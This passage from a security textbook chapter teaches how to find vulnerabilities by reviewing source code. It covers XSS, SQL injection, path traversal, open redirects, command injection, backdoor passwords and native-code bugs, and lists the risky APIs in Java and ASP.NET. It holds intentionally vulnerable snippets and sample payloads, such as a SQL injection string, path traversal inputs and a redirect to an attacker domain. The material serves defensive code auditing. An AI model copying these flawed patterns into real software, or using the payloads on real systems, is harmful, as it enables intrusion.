implemented at each layer, and what appears to be a clear vulnerability in one 
piece of source code may be fully mitigated by code elsewhere.
In most situations, black-box and white-box techniques can complement and 
enhance each other. Often, having found a prima facie vulnerability through 
code review, the easiest and most effective way to establish whether it is real 
is to test for it on the running application. Conversely, having identifi ed some 
anomalous behavior on a running application, often the easiest way to investigate its root cause is to review the relevant source code. If feasible, therefore, 
you should aim to combine a suitable mix of black- and white-box techniques. 
Allow the time and effort you devote to each to be guided by the application‚Äôs 
behavior during hands-on testing, and the size and complexity of the codebase.
Code Review Methodology
Any reasonably functional application is likely to contain many thousands of 
lines of source code, and in most cases the time available for you to review it is 
likely to be restricted, perhaps to only a few days. A key objective of effective 
code review, therefore, is to identify as many security vulnerabilities as possible, given a certain amount of time and effort. To achieve this, you must take a 
structured approach, using various techniques to ensure that the ‚Äúlow-hanging 
fruit‚Äù within the codebase is quickly identifi ed, leaving time to look for issues 
that are more subtle and harder to detect.
In the authors‚Äô experience, a threefold approach to auditing a web application codebase is effective in identifying vulnerabilities quickly and easily. This 
methodology comprises the following elements:
 1. Tracing user-controllable data from its entry points into the application, 
and reviewing the code responsible for processing it.
 2. Searching the codebase for signatures that may indicate the presence 
of common vulnerabilities, and reviewing these instances to determine 
whether an actual vulnerability exists.
 3. Performing a line-by-line review of inherently risky code to understand 
the application‚Äôs logic and fi nd any problems that may exist within it. 
Functional components that may be selected for this close review include 
the key security mechanisms within the application (authentication, session 
management, access control, and any application-wide input validation), 
interfaces to external components, and any instances where native code 
is used (typically C/C++).
We will begin by looking at the ways in which various common web application vulnerabilities appear at the level of source code and how these can be 
c19.indd 703 c19.indd 703 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 704
704 Chapter 19 n Finding Vulnerabilities in Source Code 
most easily identifi ed when performing a review. This will provide a way to 
search the codebase for signatures of vulnerabilities (step 2) and closely review 
risky areas of code (step 3).
We will then look at some of the most popular web development languages to 
identify the ways in which an application acquires user-submitted data (through 
request parameters, cookies, and so on). We will also see how an application 
interacts with the user session, the potentially dangerous APIs that exist within 
each language, and the ways in which each language‚Äôs confi guration and environment can affect the application‚Äôs security. This will provide a way to trace 
user-controllable data from its entry point to the application (step 1) as well as 
provide some per-language context to assist with the other methodology steps. 
Finally, we will discuss some tools that are useful when performing code review.
NOTE When carrying out a code audit, you should always bear in mind 
that applications may extend library classes and interfaces, may implement 
wrappers to standard API calls, and may implement custom mechanisms for 
security-critical tasks such as storing per-session information. Before launching into the detail of a code review, you should establish the extent of such 
customization and tailor your approach to the review accordingly.
Signatures of Common Vulnerabilities
Many types of web application vulnerabilities have a fairly consistent signature 
within the codebase. This means that you can normally identify a good portion of an application‚Äôs vulnerabilities by quickly scanning and searching the 
codebase. The examples presented here appear in various languages, but in 
most cases the signature is language-neutral. What matters is the programming 
technique being employed, more than the actual APIs and syntax.
Cross-Site Scripting
In the most obvious examples of XSS, parts of the HTML returned to the user 
are explicitly constructed from user-controllable data. Here, the target of an 
HREF link is constructed using strings taken directly from the query string in 
the request:
String link = ‚Äú<a href=‚Äù + HttpUtility.UrlDecode(Request.QueryString
[‚ÄúrefURL‚Äù]) + ‚Äú&SiteID=‚Äù + SiteId + ‚Äú&Path=‚Äù + HttpUtility.UrlEncode
(Request.QueryString[‚ÄúPath‚Äù]) + ‚Äú</a>‚Äù;
objCell.InnerHtml = link;
The usual remedy for cross-site scripting, which is to HTML-encode potentially 
malicious content, cannot be subsequently applied to the resulting concatenated 
c19.indd 704 c19.indd 704 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 705
 Chapter 19 n Finding Vulnerabilities in Source Code 705
string, because it already contains valid HTML markup. Any attempt to sanitize 
the data would break the application by encoding the HTML that the application 
itself has specifi ed. Hence, the example is certainly vulnerable unless fi lters are 
in place elsewhere that block requests containing XSS exploits within the query 
string. This fi lter-based approach to stopping XSS attacks is often fl awed. If it 
is present, you should closely review it to identify any ways to work around it 
(see Chapter 12).
In more subtle cases, user-controllable data is used to set the value of a variable that is later used to build the response to the user. Here, the class member 
variable m_pageTitle is set to a value taken from the request query string. It 
will presumably be used later to create the <title> element within the returned 
HTML page:
private void setPageTitle(HttpServletRequest request) throws
 ServletException
{
 String requestType = request.getParameter(‚Äútype‚Äù);
 if (‚Äú3‚Äù.equals(requestType) && null!=request.getParameter(‚Äútitle‚Äù))
 m_pageTitle = request.getParameter(‚Äútitle‚Äù);
 else m_pageTitle = ‚ÄúOnline banking application‚Äù;
}
When you encounter code like this, you should closely review the processing 
subsequently performed on the m_pageTitle variable. You should see how it is 
incorporated into the returned page to determine whether the data is suitably 
encoded to prevent XSS attacks.
The preceding example clearly demonstrates the value of a code review in 
fi nding some vulnerabilities. The XSS fl aw can be triggered only if a different 
parameter (type) has a specifi c value (3). Standard fuzz testing and vulnerability 
scanning of the relevant request may well fail to detect the vulnerability.
SQL Injection
SQL injection vulnerabilities most commonly arise when various hard-coded 
strings are concatenated with user-controllable data to form a SQL query, which 
is then executed within the database. Here, a query is constructed using data 
taken directly from the request query string:
StringBuilder SqlQuery = newStringBuilder(‚ÄúSELECT name, accno FROM
TblCustomers WHERE ‚Äú + SqlWhere);
if(Request.QueryString[‚ÄúCID‚Äù] != null &&
 Request.QueryString[‚ÄúPageId‚Äù] == ‚Äú2‚Äù)
{
 SqlQuery.Append(‚Äú AND CustomerID = ‚Äú);
c19.indd 705 c19.indd 705 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 706
706 Chapter 19 n Finding Vulnerabilities in Source Code 
 SqlQuery.Append(Request.QueryString[‚ÄúCID‚Äù].ToString());
}
...
A simple way to quickly identify this kind of low-hanging fruit within the 
codebase is to search the source for the hard-coded substrings, which are often 
used to construct queries out of user-supplied input. These substrings usually 
consist of snippets of SQL and are quoted in the source, so it can be profi table to 
search for appropriate patterns composed of quotation marks, SQL keywords, 
and spaces. For example:
‚ÄúSELECT
‚ÄúINSERT
‚ÄúDELETE
‚Äú AND
‚Äú OR
‚Äú WHERE
‚Äú ORDER BY
In each case, you should verify whether these strings are being concatenated 
with user-controllable data in a way that introduces SQL injection vulnerabilities. Because SQL keywords are processed in a case-insensitive manner, 
the searches for these terms should also be case-insensitive. Note that a space 
may be appended to each of these search terms to reduce the incidence of false 
positives in the results.
Path Traversal
The usual signature for path traversal vulnerabilities involves user-controllable 
input being passed to a fi lesystem API without any validation of the input or 
verifi cation that an appropriate fi le has been selected. In the most common 
case, user data is appended to a hard-coded or system-specifi ed directory path, 
enabling an attacker to use dot-dot-slash sequences to step up the directory tree 
to access fi les in other directories. For example:
public byte[] GetAttachment(HttpRequest Request)
{
 FileStream fsAttachment = new FileStream(SpreadsheetPath +
 HttpUtility.UrlDecode(Request.QueryString[‚ÄúAttachName‚Äù]),
 FileMode.Open, FileAccess.Read, FileShare.Read);
 byte[] bAttachment = new byte[fsAttachment.Length];
 fsAttachment.Read(FileContent, 0,
 Convert.ToInt32(fsAttachment.Length,
 CultureInfo.CurrentCulture));
 fsAttachment.Close();
c19.indd 706 c19.indd 706 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 707
 Chapter 19 n Finding Vulnerabilities in Source Code 707
 return bAttachment;
}
You should closely review any application functionality that enables users 
to upload or download fi les. You need to understand how fi lesystem APIs 
are being invoked in response to user-supplied data and determine whether 
crafted input can be used to access fi les in an unintended location. Often, you 
can quickly identify relevant functionality by searching the codebase for the 
names of any query string parameters that relate to fi lenames (AttachName in the 
current example). You also can search for all fi le APIs in the relevant language 
and review the parameters passed to them. (See later sections for listings of the 
relevant APIs in common languages.)
Arbitrary Redirection
Various phishing vectors such as arbitrary redirects are often easy to spot 
through signatures in the source code. In this example, user-supplied data from 
the query string is used to construct a URL to which the user is redirected:
private void handleCancel()
{
 httpResponse.Redirect(HttpUtility.UrlDecode(Request.QueryString[
 ‚ÄúrefURL‚Äù]) + ‚Äú&SiteCode=‚Äù +
 Request.QueryString[‚ÄúSiteCode‚Äù].ToString() +
 ‚Äú&UserId=‚Äù + Request.QueryString[‚ÄúUserId‚Äù].ToString());
}
Often, you can fi nd arbitrary redirects by inspecting client-side code, which 
of course does not require any special access to the application‚Äôs internals. 
Here, JavaScript is used to extract a parameter from the URL query string and 
ultimately redirect to it:
url = document.URL;
index = url.indexOf(‚Äò?redir=‚Äô);
target = unescape(url.substring(index + 7, url.length));
target = unescape(target);
if ((index = target.indexOf(‚Äò//‚Äô)) > 0) {
 target = target.substring (index + 2, target.length);
 index = target.indexOf(‚Äò/‚Äô);
 target = target.substring(index, target.length);
}
target = unescape(target);
document.location = target;
As you can see, the author of this script knew the script was a potential target 
for redirection attacks to an absolute URL on an external domain. The script 
c19.indd 707 c19.indd 707 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 708
708 Chapter 19 n Finding Vulnerabilities in Source Code 
checks whether the redirection URL contains a double slash (as in http://). If it 
does, the script skips past the double slash to the fi rst single slash, thereby converting it into a relative URL. However, the script then makes a fi nal call to the 
unescape() function, which unpacks any URL-encoded characters. Performing 
canonicalization after validation often leads to a vulnerability (see Chapter 2). 
In this instance an attacker can cause a redirect to an arbitrary absolute URL 
with the following query string:
?redir=http:%25252f%25252fwahh-attacker.com
OS Command Injection
Code that interfaces with external systems often contains signatures indicating code injection fl aws. In the following example, the message and address
parameters have been extracted from user-controllable form data and are passed 
directly into a call to the UNIX system API:
void send_mail(const char *message, const char *addr)
{
 char sendMailCmd[4096];
 snprintf(sendMailCmd, 4096, ‚Äúecho ‚Äò%s‚Äô | sendmail %s‚Äù, message, addr);
 system(sendMailCmd);
 return;
}
Backdoor Passwords
Unless they have been deliberately concealed by a malicious programmer, 
backdoor passwords that have been used for testing or administrative purposes 
usually stand out when you review credential validation logic. For example:
private UserProfile validateUser(String username, String password)
{
 UserProfile up = getUserProfile(username);
 if (checkCredentials(up, password) ||
 ‚Äúoculiomnium‚Äù.equals(password))
 return up;
 return null;
}
Other items that may be easily identifi ed in this way include unreferenced 
functions and hidden debug parameters.
c19.indd 708 c19.indd 708 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 709
 Chapter 19 n Finding Vulnerabilities in Source Code 709
Native Software Bugs
You should closely review any native code used by the application for classic 
vulnerabilities that may be exploitable to execute arbitrary code.
Buffer Overfl ow Vulnerabilities
These typically employ one of the unchecked APIs for buffer manipulation, of 
which there are many, including strcpy, strcat, memcpy, and sprintf, together 
with their wide-char and other variants. An easy way to identify low-hanging 
fruit within the codebase is to search for all uses of these APIs and verify 
whether the source buffer is user-controllable. You also should verify whether 
the code has explicitly ensured that the destination buffer is large enough to 
accommodate the data being copied into it (because the API itself does not do so).
Vulnerable calls to unsafe APIs are often easy to identify. In the following 
example, the user-controllable string pszName is copied into a fi xed-size stackbased buffer without checking that the buffer is large enough to accommodate it:
BOOL CALLBACK CFiles::EnumNameProc(LPTSTR pszName)
{
 char strFileName[MAX_PATH];
 strcpy(strFileName, pszName);
 ...
}
Note that just because a safe alternative to an unchecked API is employed, 
this is no guarantee that a buffer overfl ow will not occur. Sometimes, due to a 
mistake or misunderstanding, a checked API is used in an unsafe manner, as 
in the following ‚Äúfi x‚Äù of the preceding vulnerability:
BOOL CALLBACK CFiles::EnumNameProc(LPTSTR pszName)
{
 char strFileName[MAX_PATH];
 strncpy(strFileName, pszName, strlen(pszName));
 ...
}
Therefore, a thorough code audit for buffer overfl ow vulnerabilities typically 
entails a close line-by-line review of the entire codebase, tracing every operation 
performed on user-controllable data.
Integer Vulnerabilities
These come in many forms and can be extremely subtle, but some instances are 
easy to identify from signatures within the source code.
c19.indd 709 c19.indd 709 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 710
710 Chapter 19 n Finding Vulnerabilities in Source Code 
Comparisons between signed and unsigned integers often lead to problems. 
In the following ‚Äúfi x‚Äù to the previous vulnerability, a signed integer (len) is 
compared with an unsigned integer (sizeof(strFileName)). If the user can 
engineer a situation where len has a negative value, this comparison will succeed, and the unchecked strcpy will still occur:
BOOL CALLBACK CFiles::EnumNameProc(LPTSTR pszName, int len)
{
 char strFileName[MAX_PATH];
 if (len < sizeof(strFileName))
 strcpy(strFileName, pszName);
 ...
}
Format String Vulnerabilities
Typically you can identify these quickly by looking for uses of the printf and 
FormatMessage families of functions where the format string parameter is not 
hard-coded but is user-controllable. The following call to fprintf is an example:
void logAuthenticationAttempt(char* username);
{
 char tmp[64];
 snprintf(tmp, 64, ‚Äúlogin attempt for: %s\n‚Äù, username);
 tmp[63] = 0;
 fprintf(g_logFile, tmp);
}
Source Code Comments
Many software vulnerabilities are actually documented within source code 
comments. This often occurs because developers are aware that a particular 
operation is unsafe, and they record a reminder to fi x the problem later, but 
they never get around to doing so. In other cases, testing has identifi ed some 
anomalous behavior within the application that was commented within the 
code but never fully investigated. For example, the authors encountered the 
following within an application‚Äôs production code:
c19.indd 710 c19.indd 710 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 711
 Chapter 19 n Finding Vulnerabilities in Source Code 711
char buf[200]; // I hope this is big enough
...
strcpy(buf, userinput);
Searching a large codebase for comments indicating common problems is 
frequently an effective source of low-hanging fruit. Here are some search terms 
that have proven useful:
n bug
n problem
n bad
n hope
n todo
n fix
n overflow
n crash
n inject
n xss
n trust
The Java Platform
This section describes ways to acquire user-supplied input, ways to interact with 
the user‚Äôs session, potentially dangerous APIs, and security-relevant confi guration options on the Java platform.
Identifying User-Supplied Data
Java applications acquire user-submitted input via the javax.servlet.http.
HttpServletRequest interface, which extends the javax.servlet.ServletRequest
interface. These two interfaces contain numerous APIs that web applications 
can use to access user-supplied data. The APIs listed in Table 19-1 can be used 
to obtain data from the user request.
c19.indd 711 c19.indd 711 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 712
712 Chapter 19 n Finding Vulnerabilities in Source Code 
Table 19-1: APIs Used to Acquire User-Supplied Data on the Java Platform
API DESCRIPTION
getParameter
getParameterNames
getParameterValues
getParameterMap
Parameters within the URL query string and the body 
of a POST request are stored as a map of String
names to String values, which can be accessed 
using these APIs.
getQueryString Returns the entire query string contained within the 
request and can be used as an alternative to the 
getParameter APIs.
getHeader
getHeaders
getHeaderNames
HTTP headers in the request are stored as a map 
of String names to String values and can be 
accessed using these APIs.
getRequestURI
getRequestURL
These APIs return the URL contained within the 
request, including the query string.
getCookies Returns an array of Cookie objects, which contain 
details of the cookies received in the request, including their names and values.
getRequestedSessionId Used as an alternative to getCookies in some 
cases; returns the session ID value submitted within 
the request.
getInputStream
getReader
These APIs return different representations of the 
raw request received from the client and therefore can be used to access any of the information 
obtained by all the other APIs.
getMethod Returns the method used in the HTTP request.
getProtocol Returns the protocol used in the HTTP request.
getServerName Returns the value of the HTTP Host header.
getRemoteUser
getUserPrincipal
If the current user is authenticated, these APIs return 
details of the user, including his login name. If users 
can choose their own username during self-registration, this may be a means of introducing malicious 
input into the application‚Äôs processing.
Session Interaction
Java Platform applications use the javax.servlet.http.HttpSession interface 
to store and retrieve information within the current session. Per-session storage 
is a map of string names to object values. The APIs listed in Table 19-2 are used 
to store and retrieve data within the session.
c19.indd 712 c19.indd 712 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 713
 Chapter 19 n Finding Vulnerabilities in Source Code 713
Table 19-2: APIs Used to Interact with the User‚Äôs Session on the Java Platform
API DESCRIPTION
setAttribute
putValue
Used to store data within the current session.
getAttribute
getValue
getAttributeNames
getValueNames
Used to query data stored within the current session.
Potentially Dangerous APIs
This section describes some common Java APIs that can introduce security 
vulnerabilities if used in an unsafe manner.
File Access
The main class used to access fi les and directories in Java is java.io.File.
From a security perspective, the most interesting uses of this class are calls to 
its constructor, which may take a parent directory and fi lename, or simply a 
pathname.
Whichever form of the constructor is used, path traversal vulnerabilities 
may exist if user-controllable data is passed as the fi lename parameter without 
checking for dot-dot-slash sequences. For example, the following code opens a 
fi le in the root of the C:\ drive on Windows:
String userinput = ‚Äú..\\boot.ini‚Äù;
File f = new File(‚ÄúC:\\temp‚Äù, userinput);
The classes most commonly used for reading and writing fi le contents in 
Java are:
n java.io.FileInputStream
n java.io.FileOutputStream
n java.io.FileReader
n java.io.FileWriter
These classes take a File object in their constructors or may open a fi le 
themselves via a fi lename string, which may again introduce path traversal 
vulnerabilities if user-controllable data is passed as this parameter. For example:
String userinput = ‚Äú..\\boot.ini‚Äù;
FileInputStream fis = new FileInputStream(‚ÄúC:\\temp\\‚Äù + userinput);
c19.indd 713 c19.indd 713 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 714
714 Chapter 19 n Finding Vulnerabilities in Source Code 
Database Access
The following are the APIs most commonly used for executing an arbitrary 
string as a SQL query:
n java.sql.Connection.createStatement
n java.sql.Statement.execute
n java.sql.Statement.executeQuery
If user-controllable input is part of the string being executed as a query, it is 
probably vulnerable to SQL injection. For example:
String username = ‚Äúadmin‚Äô or 1=1--‚Äù;
String password = ‚Äúfoo‚Äù;
Statement s = connection.createStatement();
s.executeQuery(‚ÄúSELECT * FROM users WHERE username = ‚Äú‚Äô + username +
 ‚Äú‚Äô AND password = ‚Äú‚Äô + password + ‚Äú‚Äô‚Äù);
executes this unintended query:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô or 1=1--‚Äô AND password = ‚Äòfoo‚Äô
The following APIs are a more robust and secure alternative to the ones previously described. They allow an application to create a precompiled SQL statement 
and set the value of its parameter placeholders in a secure and type-safe way:
n java.sql.Connection.prepareStatement
n java.sql.PreparedStatement.setString
n java.sql.PreparedStatement.setInt
n java.sql.PreparedStatement.setBoolean
n java.sql.PreparedStatement.setObject
n java.sql.PreparedStatement.execute
n java.sql.PreparedStatement.executeQuery
and so on.
If used as intended, these are not vulnerable to SQL injection. For example:
String username = ‚Äúadmin‚Äô or 1=1--‚Äù;
String password = ‚Äúfoo‚Äù;
Statement s = connection.prepareStatement(
 ‚ÄúSELECT * FROM users WHERE username = ? AND password = ?‚Äù);
s.setString(1, username);
s.setString(2, password);
s.executeQuery();
c19.indd 714 c19.indd 714 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 715
 Chapter 19 n Finding Vulnerabilities in Source Code 715
results in a query that is equivalent to the following:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô‚Äô or 1=1--‚Äô AND 
password = ‚Äòfoo‚Äô
Dynamic Code Execution
The Java language itself does not contain any mechanism for dynamic evaluation 
of Java source code, although some implementations (notably within database 
products) provide a facility to do this. If the application you are reviewing constructs any Java code on the fl y, you should understand how this is done and 
determine whether any user-controllable data is being used in an unsafe way.
OS Command Execution
The following APIs are the means of executing external operating system commands from within a Java application:
n java.lang.runtime.Runtime.getRuntime
n java.lang.runtime.Runtime.exec
If the user can fully control the string parameter passed to exec, the application 
is almost certainly vulnerable to arbitrary command execution. For example, 
the following causes the Windows calc program to run:
String userinput = ‚Äúcalc‚Äù;
Runtime.getRuntime.exec(userinput);
However, if the user controls only part of the string passed to exec, the application may not be vulnerable. In the following example, the user-controllable 
data is passed as command-line arguments to the notepad process, causing it 
to attempt to load a document called | calc:
String userinput = ‚Äú| calc‚Äù;
Runtime.getRuntime.exec(‚Äúnotepad ‚Äú + userinput);
The exec API itself does not interpret shell metacharacters such as & and |,
so this attack fails.
Sometimes, controlling only part of the string passed to exec may still be 
suffi cient for arbitrary command execution, as in the following subtly different 
example (note the missing space after notepad):
String userinput = ‚Äú\\..\\system32\\calc‚Äù;
Runtime.getRuntime().exec(‚Äúnotepad‚Äù + userinput);
c19.indd 715 c19.indd 715 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 716
716 Chapter 19 n Finding Vulnerabilities in Source Code 
Often, in this type of situation, the application is vulnerable to something 
other than code execution. For example, if an application executes the program 
wget with a user-controllable parameter as the target URL, an attacker may 
be able to pass dangerous command-line arguments to the wget process. For 
example, the attacker might cause wget to download a document and save it to 
an arbitrary location in the fi lesystem.
URL Redirection
The following APIs can be used to issue an HTTP redirect in Java:
n javax.servlet.http.HttpServletResponse.sendRedirect
n javax.servlet.http.HttpServletResponse.setStatus
n javax.servlet.http.HttpServletResponse.addHeader
The usual means of causing a redirect response is via the sendRedirect
method, which takes a string containing a relative or absolute URL. If the value 
of this string is user-controllable, the application is probably vulnerable to a 
phishing vector.
You should also be sure to review any uses of the setStatus and addHeader
APIs. Given that a redirect simply involves a 3xx response containing an HTTP 
Location header, an application may implement redirects using these APIs.
Sockets
The java.net.Socket class takes various forms of target host and port details 
in its constructors. If the parameters passed are user-controllable in any way, 
the application may be exploitable to cause network connections to arbitrary 
hosts, either on the Internet or on the private DMZ or internal network on which 
the application is hosted.
Confi guring the Java Environment
The web.xml fi le contains confi guration settings for the Java Platform environment 
and controls how applications behave. If an application is using container-managed security, authentication and authorization are declared in web.xml against 
each resource or collection of resources to be secured, outside the application 
code. Table 19-3 shows confi guration options that may be set in the web.xml fi le.
Servlets can enforce programmatic checks with HttpServletRequest.isUserInRole to access the same role information from within the servlet code. A 
c19.indd 716 c19.indd 716 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 717
 Chapter 19 n Finding Vulnerabilities in Source Code 717
mapping entry security-role-ref links the built-in role check with the corresponding container role.
In addition to web.xml, different application servers may use secondary deployment fi les (for example, weblogic.xml) containing other security-relevant settings. 
You should include these when examining the environment‚Äôs confi guration.
Table 19-3: Security-Relevant Confi guration Settings for the Java Environment
SETTING DESCRIPTION
login-config Authentication details can be confi gured within the loginconfig element.
The two categories of authentication are forms-based (the 
page is specifi ed by the form-login-page element) and 
Basic Auth or Client-Cert, specifi ed within the authmethod element.
If forms-based authentication is used, the specifi ed form must 
have the action defi ned as j_security_check and must 
submit the parameters j_username and j_password. Java 
applications recognize this as a login request.
securityconstraint
If the login-config element is defi ned, resources can be 
restricted using the security-constraint element. This 
can be used to defi ne the resources to be protected.
Within the security-constraint element, resource collections can be defi ned using the url-pattern element. For 
example:
<url-pattern>/admin/*</url-pattern>
These are accessible to roles and principals defi ned in the 
role-name and principal-name elements, respectively.
session-config The session timeout (in minutes) can be confi gured within the 
session-timeout element.
error-page The application‚Äôs error handling is defi ned within the errorpage element. HTTP error codes and Java exceptions can be 
handled on an individual basis through the error-code and 
exception-type elements.
init-param Various initialization parameters are confi gured within the 
init-param element. These may include security-specifi c settings such as listings, which should be set to false, and 
debug, which should be set to 0.
c19.indd 717 c19.indd 717 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 718
718 Chapter 19 n Finding Vulnerabilities in Source Code 
ASP.NET
This section describes methods of acquiring user-supplied input, ways of interacting with the user‚Äôs session, potentially dangerous APIs, and security-relevant 
confi guration options on the ASP.NET platform.
Identifying User-Supplied Data
ASP.NET applications acquire user-submitted input via the System.Web
.HttpRequest class. This class contains numerous properties and methods that 
web applications can use to access user-supplied data. The APIs listed in Table 
19-4 can be used to obtain data from the user request.
Table 19-4: APIs Used to Acquire User-Supplied Data on the ASP.NET Platform
API DESCRIPTION
Params Parameters within the URL query string, the body of 
a POST request, HTTP cookies, and miscellaneous 
server variables are stored as maps of string names to 
string values. This property returns a combined collection of all these parameter types.
Item Returns the named item from within the Params
collection.
Form Returns a collection of the names and values of form 
variables submitted by the user.
QueryString Returns a collection of the names and values of variables within the query string in the request.
ServerVariables Returns a collection of the names and values of a 
large number of ASP server variables (akin to CGI 
variables). This includes the raw data of the request, 
query string, request method, HTTP Host header, and 
so on.
Headers HTTP headers in the request are stored as a map of 
string names to string values and can be accessed 
using this property.
Url
RawUrl
Return details of the URL contained within the 
request, including the query string.
UrlReferrer Returns information about the URL specifi ed in the 
HTTP Referer header in the request.
c19.indd 718 c19.indd 718 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 719
 Chapter 19 n Finding Vulnerabilities in Source Code 719
API DESCRIPTION
Cookies Returns a collection of Cookie objects, which contain 
details of the cookies received in the request, including their names and values.
Files Returns a collection of fi les uploaded by the user.
InputStream
BinaryRead
Return different representations of the raw request 
received from the client and therefore can be used 
to access any of the information obtained by all the 
other APIs.
HttpMethod Returns the method used in the HTTP request.
Browser
UserAgent
Return details of the user‚Äôs browser, as submitted in 
the HTTP User-Agent header.
AcceptTypes Returns a string array of client-supported MIME types, 
as submitted in the HTTP Accept header.
UserLanguages Returns a string array containing the languages 
accepted by the client, as submitted in the HTTP 
Accept-Language header.
Session Interaction
ASP.NET applications can interact with the user‚Äôs session to store and retrieve 
information in various ways.
The Session property provides a simple way to store and retrieve information 
within the current session. It is accessed in the same way as any other indexed 
collection:
Session[‚ÄúMyName‚Äù] = txtMyName.Text; // store user‚Äôs name
lblWelcome.Text = ‚ÄúWelcome ‚Äú+Session[‚ÄúMyName‚Äù]; // retrieve user‚Äôs name
ASP.NET profi les work much like the Session property does, except that they 
are tied to the user‚Äôs profi le and therefore actually persist across different sessions belonging to the same user. Users are reidentifi ed across sessions either 
through authentication or via a unique persistent cookie. Data is stored and 
retrieved in the user profi le as follows:
Profile.MyName = txtMyName.Text; // store user‚Äôs name
lblWelcome.Text = ‚ÄúWelcome ‚Äú + Profile.MyName; // retrieve user‚Äôs name
The System.Web.SessionState.HttpSessionState class provides another 
way to store and retrieve information within the session. It stores information 
c19.indd 719 c19.indd 719 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 720
720 Chapter 19 n Finding Vulnerabilities in Source Code 
as a mapping from string names to object values, which can be accessed using 
the APIs listed in Table 19-5.
Table 19-5: APIs Used to Interact with the User‚Äôs Session on the ASP.NET Platform
API DESCRIPTION
Add Adds a new item to the session collection.
Item Gets or sets the value of a named item in the collection.
Keys
GetEnumerator
Return the names of all items in the collection.
CopyTo Copies the collection of values to an array.
Potentially Dangerous APIs
This section describes some common ASP.NET APIs that can introduce security 
vulnerabilities if used in an unsafe manner.
File Access
System.IO.File is the main class used to access fi les in ASP.NET. All of its 
relevant methods are static, and it has no public constructor.
The 37 methods of this class all take a fi lename as a parameter. Path traversal 
vulnerabilities may exist in every instance where user-controllable data is passed 
in without checking for dot-dot-slash sequences. For example, the following 
code opens a fi le in the root of the C:\ drive on Windows:
string userinput = ‚Äú..\\boot.ini‚Äù;
FileStream fs = File.Open(‚ÄúC:\\temp\\‚Äù + userinput, 
 FileMode.OpenOrCreate);
The following classes are most commonly used to read and write fi le 
contents:
n System.IO.FileStream
n System.IO.StreamReader
n System.IO.StreamWriter
They have various constructors that take a fi le path as a parameter. These 
may introduce path traversal vulnerabilities if user-controllable data is passed. 
For example:
string userinput = ‚Äú..\\foo.txt‚Äù;
FileStream fs = new FileStream(‚ÄúF:\\tmp\\‚Äù + userinput,
 FileMode.OpenOrCreate);
c19.indd 720 c19.indd 720 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 721
 Chapter 19 n Finding Vulnerabilities in Source Code 721
Database Access
Numerous APIs can be used for database access within ASP.NET. The following 
are the main classes that can be used to create and execute a SQL statement:
n System.Data.SqlClient.SqlCommand
n System.Data.SqlClient.SqlDataAdapter
n System.Data.Oledb.OleDbCommand
n System.Data.Odbc.OdbcCommand
n System.Data.SqlServerCe.SqlCeCommand
Each of these classes has a constructor that takes a string containing a SQL 
statement. Also, each has a CommandText property that can be used to get and set 
the current value of the SQL statement. When a command object has been suitably confi gured, it is executed via a call to one of the various Execute methods.
If user-controllable input is part of the string being executed as a query, the 
application is probably vulnerable to SQL injection. For example:
string username = ‚Äúadmin‚Äô or 1=1--‚Äù;
string password = ‚Äúfoo‚Äù;
OdbcCommand c = new OdbcCommand(‚ÄúSELECT * FROM users WHERE username = ‚Äò‚Äù
 + username + ‚Äú‚Äô AND password = ‚Äú‚Äô + password + ‚Äú‚Äô‚Äù, connection);
c.ExecuteNonQuery();
executes this unintended query:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô or 1=1--‚Äô 
 AND password = ‚Äòfoo‚Äô
Each of the classes listed supports prepared statements via their Parameters
property, which allows an application to create a SQL statement containing 
parameter placeholders and set their values in a secure and type-safe way. If 
used as intended, this mechanism is not vulnerable to SQL injection. For example:
string username = ‚Äúadmin‚Äô or 1=1--‚Äù;
string password = ‚Äúfoo‚Äù;
OdbcCommand c = new OdbcCommand(‚ÄúSELECT * FROM users WHERE username =
 @username AND password = @password‚Äù, connection);
c.Parameters.Add(new OdbcParameter(‚Äú@username‚Äù, OdbcType.Text).Value = 
username);
c.Parameters.Add(new OdbcParameter(‚Äú@password‚Äù, OdbcType.Text).Value = 
password);
c.ExecuteNonQuery();
results in a query that is equivalent to the following:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô‚Äô or 1=1--‚Äô 
 AND password = ‚Äòfoo‚Äô
c19.indd 721 c19.indd 721 8/19/2011 12:18:35 PM 8/19/2011 12:18:35 PM
Stuttard c19.indd V2 - 08/11/2011 Page 722
722 Chapter 19 n Finding Vulnerabilities in Source Code 
Dynamic Code Execution
The VBScript function Eval takes a string argument containing a VBScript 
expression. The function evaluates this expression and returns the result. If usercontrollable data is incorporated into the expression to be evaluated, it might 
